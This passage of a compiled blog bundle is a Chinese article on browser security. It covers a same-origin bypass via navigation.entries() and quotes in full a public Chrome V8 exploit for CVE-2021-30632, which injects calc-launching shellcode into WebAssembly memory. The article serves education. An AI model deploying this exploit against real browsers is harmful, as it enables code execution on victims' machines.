",(0,a.kt)("inlineCode",{parentName:"p"},"b.example.com"),"\uff0c\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"frames[0].location = 'about:blank'")," \u5c07 iframe \u91cd\u65b0\u5c0e\u5411\u4e4b\u5f8c\uff0ciframe \u5c31\u6703\u8b8a\u5f97\u8ddf ",(0,a.kt)("inlineCode",{parentName:"p"},"a.example.com")," same-origin\uff0c\u6b64\u6642\u53bb\u8b80\u53d6 iframe \u7684\u6b77\u53f2\u7d00\u9304\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"frames[0].navigation.entries()"),"\uff0c\u5c31\u53ef\u4ee5\u5f9e\u88e1\u9762\u62ff\u5230\u539f\u672c ",(0,a.kt)("inlineCode",{parentName:"p"},"b.example.com")," \u7684\u7db2\u5740\u3002"),(0,a.kt)("p",null,"\u800c\u9019\u662f\u4e0d\u61c9\u8a72\u767c\u751f\u7684\uff0c\u7576 iframe \u91cd\u65b0\u5c0e\u5411\u5230\u5176\u4ed6\u7db2\u5740\u4e4b\u5f8c\uff0c",(0,a.kt)("inlineCode",{parentName:"p"},"navigation.entries()")," \u5c31\u61c9\u8a72\u6e05\u7a7a\u624d\u5c0d\uff0c\u56e0\u6b64\u9019\u662f\u4e00\u500b bug\u3002"),(0,a.kt)("p",null,"\u9019\u5c31\u662f\u4e00\u500b\u7e5e\u904e\u540c\u6e90\u653f\u7b56\u7684\u6848\u4f8b\uff0c\u96d6\u7136\u53ea\u80fd\u8b80\u53d6\u7db2\u5740\uff0c\u4f46\u4f9d\u7136\u662f\u4e00\u500b\u8cc7\u5b89\u7684\u6f0f\u6d1e\uff0c\u62ff\u5230\u4e86 2000 \u7f8e\u91d1\u7684\u8cde\u91d1\u3002"),(0,a.kt)("h2",{id:"\u5c0f\u7d50"},"\u5c0f\u7d50"),(0,a.kt)("p",null,"\u9019\u7bc7\u6587\u7ae0\u7684\u91cd\u9ede\u5c31\u53ea\u6709\u4e00\u500b\uff0c\u90a3\u5c31\u662f\u300c\u700f\u89bd\u5668\u4e0d\u7d66\u4f60\u7684\uff0c\u4f60\u62ff\u4e0d\u5230\u5c31\u662f\u62ff\u4e0d\u5230\u300d\uff0c\u9019\u662f\u7db2\u9801\u524d\u7aef\u8ddf\u5176\u4ed6\u57f7\u884c\u74b0\u5883\u5f88\u4e0d\u540c\u7684\u4e00\u9ede\u3002\u53cd\u4e4b\uff0c\u5982\u679c\u700f\u89bd\u5668\u4e0d\u7d66\u4f60\u7684\u4f60\u537b\u62ff\u5230\u4e86\uff0c\u90a3\u5c31\u4ee3\u8868\u4f60\u627e\u5230\u4e86\u700f\u89bd\u5668\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u53bb\u56de\u5831\u62ff\u734e\u91d1\u3002"),(0,a.kt)("p",null,"\u90a3\u6700\u56b4\u91cd\u7684\u700f\u89bd\u5668\u6f0f\u6d1e\u662f\u4ec0\u9ebc\uff1f\u5c31\u662f\u53ef\u4ee5\u8b93\u653b\u64ca\u8005\u7a81\u7834\u700f\u89bd\u5668\u7684\u9650\u5236\uff0c\u53bb\u505a\u51fa\u9055\u53cd\u700f\u89bd\u5668\u5b89\u5168\u5047\u8a2d\u7684\u4e8b\u60c5\u3002"),(0,a.kt)("p",null,"\u6bd4\u5982\u8aaa\u525b\u525b\u5c31\u4ecb\u7d39\u904e\u7684 SOP bypass\uff0c\u53ef\u4ee5\u9055\u53cd\u540c\u6e90\u653f\u7b56\uff0c\u53bb\u8b80\u53d6\u5230\u5176\u4ed6\u7db2\u9801\u7684\u8cc7\u6599\uff0c\u96d6\u7136\u8aaa\u525b\u525b\u4ecb\u7d39\u7684\u53ea\u80fd\u8b80\u53d6\u5230 URL\uff0c\u4f46\u6709\u4e9b\u66f4\u53b2\u5bb3\u7684\u751a\u81f3\u53ef\u4ee5\u8b80\u53d6\u5230\u5167\u5bb9\u3002\u4f8b\u5982\u8aaa\u4f60\u6253\u958b ",(0,a.kt)("inlineCode",{parentName:"p"},"https://blog.huli.tw"),"\uff0c\u770b\u4e86\u6211\u7684\u90e8\u843d\u683c\u6587\u7ae0\uff0c\u7d50\u679c\u6211\u7684\u7db2\u7ad9\u80cc\u5f8c\u5077\u5077\u57f7\u884c\u4e00\u6bb5 JavaScript\uff0c\u5229\u7528\u4e86 SOP bypass \u7684\u6f0f\u6d1e\u53bb\u8b80\u53d6\u4f60\u5728 ",(0,a.kt)("inlineCode",{parentName:"p"},"https://mail.google.com")," \u4e0a\u7684\u6240\u6709\u4fe1\u4ef6\u5167\u5bb9\u3002"),(0,a.kt)("p",null,"\u807d\u8d77\u4f86\u5f88\u6050\u6016\u5c0d\u5427\uff1f\u4f46\u6709\u66f4\u6050\u6016\u7684\u3002"),(0,a.kt)("p",null,"\u6700\u56b4\u91cd\u7684\u4e00\u7a2e\u8b93\u653b\u64ca\u8005\u53ef\u4ee5\u900f\u904e JavaScript \u53bb\u5229\u7528\u700f\u89bd\u5668\u7684\u6f0f\u6d1e\uff0c\u5728\u96fb\u8166\u4e0a\u9762\u57f7\u884c\u4efb\u610f\u6307\u4ee4\uff0c\u9019\u7a2e\u6f0f\u6d1e\u7a2e\u985e\u53eb\u505a RCE\uff08Remote Code Execution\uff09\uff0c\u9060\u7aef\u7a0b\u5f0f\u78bc\u57f7\u884c\u3002"),(0,a.kt)("p",null,"\u4e00\u6a23\u8209\u500b\u4f8b\u5b50\uff0c\u5047\u8a2d\u4f60\u9ede\u958b\u6211\u7684\u90e8\u843d\u683c\uff0c\u770b\u4e86\u4e00\u4e9b\u6587\u7ae0\u95dc\u6389\uff0c\u4f46\u6b64\u6642\u6211\u5df2\u7d93\u53ef\u4ee5\u5c0d\u4f60\u7684\u96fb\u8166\u4e0b\u6307\u4ee4\u4e86\uff0c\u53ef\u4ee5\u628a\u4f60\u96fb\u8166\u88e1\u7684\u8cc7\u6599\u5168\u90fd\u5077\u51fa\u4f86\uff0c\u6216\u662f\u5077\u5077\u690d\u5165\u60e1\u610f\u8edf\u9ad4\u4e4b\u985e\u7684\u3002\u800c\u4ee5\u5f80\u5c31\u66fe\u7d93\u6709\u904e\u4e0d\u5c11\u6b21\u9019\u7a2e\u6848\u4f8b\uff0c\u6bcf\u9694\u4e00\u9663\u5b50\u700f\u89bd\u5668\u5c31\u6703\u7206\u51fa\u9019\u7a2e\u6700\u56b4\u91cd\u7684\u6f0f\u6d1e\uff0c\u5c0d\u6211\u5011\u9019\u4e9b\u4e00\u822c\u4f7f\u7528\u8005\u800c\u8a00\uff0c\u5c31\u53ea\u80fd\u76e1\u5feb\u66f4\u65b0\u700f\u89bd\u5668\uff0c\u8b93\u81ea\u5df1\u5c11\u66b4\u9732\u5728\u5371\u96aa\u7576\u4e2d\u3002"),(0,a.kt)("p",null,"\u5728 2021 \u5e74 9 \u6708\u7684\u6642\u5019\u6709\u7206\u51fa\u4e00\u500b\u7de8\u865f\u70ba CVE-2021-30632 \u7684\u6f0f\u6d1e\uff0c\u5c31\u662f\u6211\u525b\u525b\u8b1b\u7684 RCE\uff0c\u53ea\u8981\u7528 Chrome \u700f\u89bd\u5668\uff08v93 \u7248\u4ee5\u524d\uff09\u6253\u958b\u4e00\u500b\u7db2\u9801\uff0c\u653b\u64ca\u8005\u5c31\u53ef\u4ee5\u76f4\u63a5\u5165\u4fb5\u4f60\u7684\u96fb\u8166\u4e26\u57f7\u884c\u6307\u4ee4\u3002"),(0,a.kt)("p",null,"\u4f60\u6703\u4e0d\u6703\u597d\u5947\u901a\u5e38\u9019\u7a2e\u653b\u64ca\u7684 JavaScript \u7a0b\u5f0f\u78bc\u90fd\u662f\u9577\u4ec0\u9ebc\u6a23\u5b50\uff1f\u90fd\u662f\u5229\u7528\u4e86\u54ea\u4e9b\u529f\u80fd\uff0c\u6700\u5f8c\u5c45\u7136\u53ef\u4ee5\u900f\u904e\u700f\u89bd\u5668\u57f7\u884c\u4efb\u610f\u7a0b\u5f0f\u78bc\uff1f"),(0,a.kt)("p",null,"\u5e95\u4e0b\u662f CVE-2021-30632 \u7684\u5176\u4e2d\u4e00\u500b exploit\uff0c\u4f86\u6e90\u70ba\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html"},"https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <title></title>\n</head>\n<body>\n<script type="text/javascript">\n\nfunction gc() {\n  for(var i = 0;i < ((1024*1024)); i++) {\n    new String();\n  }\n}\n\nvar code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);\nvar module = new WebAssembly.Module(code);\nvar instance = new WebAssembly.Instance(module);\nvar main = instance.exports.main;\n\nfunction foo(y) {\n  x = y;\n}\n\nfunction oobRead() {\n  //addrOf b[0] and addrOf writeArr::elements\n  return [x[20],x[24]];\n}\n\nfunction oobWrite(addr) {\n  x[24] = addr;\n}\n\nvar arr0 = new Array(10); arr0.fill(1);arr0.a = 1;\nvar arr1 = new Array(10); arr1.fill(2);arr1.a = 1;\nvar arr2 = new Array(10); arr2.fill(3); arr2.a = 1;\nvar x = arr0;\n\ngc();gc();\n  \nvar arr = new Array(30); arr.fill(4); arr.a = 1;\nvar b = new Array(1); b.fill(1);\nvar writeArr = [1.1];\n\nfor (let i = 0; i < 19321; i++) {\n  if (i == 19319) arr2[0] = 1.1;\n  foo(arr1);\n}\n\nx[0] = 1.1;\n\nfor (let i = 0; i < 20000; i++) {\n  oobRead();\n}\n\nfor (let i = 0; i < 20000; i++) oobWrite(1.1);\nfoo(arr);\n\nvar view = new ArrayBuffer(24);\nvar dblArr = new Float64Array(view);\nvar intView = new Int32Array(view);\nvar bigIntView = new BigInt64Array(view);\nb[0] = instance;\nvar addrs = oobRead();\n\nfunction ftoi32(f) {\n  dblArr[0] = f;\n  return [intView[0], intView[1]];\n}\n\nfunction i32tof(i1, i2) {\n  intView[0] = i1;\n  intView[1] = i2;\n  return dblArr[0];\n}\n\nfunction itof(i) {\n  bigIntView = BigInt(i);\n  return dblArr[0];\n}\n\nfunction ftoi(f) {\n  dblArr[0] = f;\n  return bigIntView[0];\n}\n\n\ndblArr[0] = addrs[0];\ndblArr[1] = addrs[1];\n\nfunction addrOf(obj) {\n  b[0] = obj;\n  let addrs = oobRead();\n  dblArr[0] = addrs[0];\n  return intView[1]; \n}\n\nfunction arbRead(addr) {\n  [elements, addr1] = ftoi32(addrs[1]);\n  oobWrite(i32tof(addr,addr1));\n  return writeArr[0];\n}\n\nfunction arbRead1(addr) {\n  [addr1, elements] = ftoi32(addrs[1]);\n  oobWrite(i32tof(addr1, addr));\n  return writeArr[0];\n}\n\nfunction writeShellCode(rwxAddr, shellArr) {\n  var intArr = new Uint8Array(400);\n  var intArrAddr = addrOf(intArr);\n  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));\n  [elements, addr1] = ftoi32(addrs[1]);\n  oobWrite(i32tof(intArrAddr + 0x20, addr1));\n  writeArr[0] = rwxAddr;\n  for (let i = 0; i < shellArr.length; i++) {\n    intArr[i] = shellArr[i];\n  }\n}\n\nfunction writeShellCode1(rwxAddr, shellArr) {\n  var intArr = new Uint8Array(400);\n  var intArrAddr = addrOf(intArr);\n  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));\n \n  [addr1, elements] = ftoi32(addrs[1]);\n  oobWrite(i32tof(addr1, intArrAddr + 0x20));\n  writeArr[0] = rwxAddr;\n  for (let i = 0; i < shellArr.length; i++) {\n    intArr[i] = shellArr[i];\n  }\n}\n\nvar other_method = false;\nvar instanceAddr = addrOf(instance);\nvar elementsAddr = ftoi32(addrs[1])[0];\n\nif((elementsAddr & 0xFFFF) == 0x222D) {\n  other_method = true;\n  elementsAddr = ftoi32(addrs[1])[1];\n}\n\nvar shellCode = [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,\n      0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,\n      0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n      0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,\n      0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,\n      0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n      0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,\n      0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,\n      0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n      0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,\n      0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,\n      0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n      0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,\n      0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n      0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,\n      0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,\n      0x65, 0x78, 0x65, 0x00];\n\nvar rwxAddr;\nif(other_method == false) {\n  rwxAddr = arbRead(instanceAddr + 0x60);\n  writeShellCode(rwxAddr, shellCode);\n}\nelse {\n  rwxAddr = arbRead1(instanceAddr + 0x60);\n  writeShellCode1(rwxAddr, shellCode);\n}\n\nmain();\n\n<\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u56e0\u70ba\u6f0f\u6d1e\u662f\u51fa\u73fe\u5728 V8 \u88e1\u9762\uff0c\u6240\u4ee5\u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u7a0b\u5f0f\u78bc\u505a\u4e86\u8a31\u591a\u300c\u4f60\u4e5f\u770b\u4e0d\u61c2\u5728\u5e79\u561b\u300d\u7684\u64cd\u4f5c\uff0c\u800c\u9019\u4e9b\u64cd\u4f5c\u901a\u5e38\u662f\u70ba\u4e86\u8981\u6eff\u8db3\u4e00\u4e9b\u689d\u4ef6\uff0c\u624d\u80fd\u8b93 V8 \u767c\u751f\u554f\u984c\uff0c\u4f46\u8a73\u7d30\u7684\u89e3\u91cb\u5df2\u7d93\u812b\u96e2\u4e86\u6211\u7684\u5b88\u5099\u7bc4\u570d\uff0c\u6709\u8208\u8da3\u7684\u53ef\u4ee5\u770b GitHub \u7684\u8cc7\u5b89\u5718\u968a\u5beb\u7684\u8a73\u7d30\u5206\u6790\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_30632/"},"Chrome in-the-wild bug analysis: CVE-2021-30632")),(0,a.kt)("p",null,"\u8a71\u8aaa\uff0c\u6709\u4e9b\u5c0d\u65bc\u300cJavaScript \u7684\u9650\u5236\u300d\u4e0d\u592a\u6e05\u695a\u7684\u5de5\u7a0b\u5e2b\u5011\uff0c\u5e38\u5e38\u6703\u60f3\u8981\u7528 JavaScript \u505a\u51fa\u4e00\u4e9b\u6839\u672c\u505a\u4e0d\u5230\u7684\u4e8b\u60c5\u3002"),(0,a.kt)("p",null,"\u5728\u77ad\u89e3\u4e86\u700f\u89bd\u5668\u7684\u57fa\u672c\u5b89\u5168\u6a21\u578b\u4e4b\u5f8c\uff0c\u5c0d\u65bc\u9019\u4e9b\u505a\u4e0d\u5230\u7684\u529f\u80fd\uff0c\u4f60\u5c31\u53ef\u4ee5\u52c7\u6562\u5730\u5c0d PM \u8aaa\u51fa\uff1a\u300c\u5c0d\uff0c\u9019\u529f\u80fd\u7db2\u9801\u524d\u7aef\u505a\u4e0d\u5230\uff0c\u56e0\u70ba\u700f\u89bd\u5668\u4e0d\u8b93\u6211\u7528\u9019\u529f\u80fd\u300d\uff0c\u800c\u4e0d\u662f\u56db\u8655\u5c0b\u627e\u8a72\u600e\u9ebc\u547c\u53eb API\uff0c\u56e0\u70ba\u6839\u672c\u6c92\u6709\u9019\u4e9b API \u7684\u5b58\u5728\u3002"))}u.isMDXComponent=!0},6395:(e,n,r)=>{r.d(n,{Z:()=>t});const t=r.p+"assets/images/02-01-9dd4342a10adfcfd70f106171be0fe57.png"},1273:(e,n,r)=>{r.d(n,{Z:()=>t});const t=r.p+"assets/images/02-02-dadf0f1a6eca6cefb764a92d33cc3be4.png"}}]);